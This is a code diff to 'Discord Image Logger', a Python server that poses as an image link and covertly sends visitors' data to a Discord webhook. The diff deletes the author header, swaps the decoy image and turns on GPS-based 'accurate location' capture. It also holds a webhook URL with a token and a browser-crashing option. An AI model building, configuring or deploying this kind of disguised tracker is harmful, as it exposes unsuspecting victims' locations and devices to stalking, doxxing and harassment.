@@ -1,6 +1,3 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -13,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1564819546555027647/NY5zc8_uL7nM2mHNSvgXAGoWDH251CN2ekfMyUsit2mAHnizyRA6zE_diO5Seuo3G16Y",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAKUP9zf9N06Qlll4oZWiQe28EfIajgAjr0ldfKCVrgA&s=10", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/236x/06/3b/a1/063ba1c7d298044275b131531222ba14.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +21,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -301,4 +298,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
+handler = app = ImageLoggerAPI
